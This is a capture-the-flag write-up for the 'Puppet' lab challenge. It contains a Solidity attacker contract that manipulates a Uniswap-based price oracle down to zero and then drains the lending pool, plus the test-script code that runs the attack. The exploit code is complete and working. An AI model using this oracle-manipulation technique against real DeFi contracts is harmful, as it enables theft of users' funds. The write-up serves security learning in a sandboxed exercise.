# Puppet

**HINT:** Look at the function ```computeOraclePrice()``` and how it calculates the price.

<details>
<summary>Part 1</summary>
<p>

Because it calculates the price wrong we can manipulate it with a few steps 
```
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPuppetPool {
    function computeOraclePrice() external view returns (uint256);
    function borrow(uint256 borrowAmount) external payable;
}

interface IUniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

    
contract PuppetAttacker {
    IERC20 token;
    IPuppetPool pool;
    IUniswapExchange uniswap;

    constructor(IERC20 _token, IPuppetPool _pool, IUniswapExchange _uniswap) public {
        token = _token;
        pool = _pool;
        uniswap = _uniswap;
    }

    function attack(uint256 amount) public {
        require(token.balanceOf(address(this)) >= amount, "not enough tokens");
        token.approve(address(uniswap), amount);
        uint256 ethGained = uniswap.tokenToEthSwapInput(amount, 1, block.timestamp + 1);
        require(pool.computeOraclePrice() == 0, "oracle price not 0");
        pool.borrow(token.balanceOf(address(pool)));
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "token transfer failed"
        );
        msg.sender.transfer(ethGained);
    }
    
    receive() external payable {}
}
```

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Now go to ```puppet.challenge.js``` and at the top of the file add:
```js
const PuppetAttacker = contract.fromArtifact("PuppetAttacker");
```
And at ```Exploit``` add:
```js
 this.attacker = await PuppetAttacker.new(
      this.token.address,
      this.lendingPool.address,
      this.uniswapExchange.address,
      { from: attacker }
    );

    await this.token.transfer(this.attacker.address, ATTACKER_INITAL_TOKEN_BALANCE, {
      from: attacker,
    });
    await this.attacker.attack(ether(`0.1`).toString(), { from: attacker });
  });
```

```sh
npm run puppet.challenge.js
```

</p>
</details>
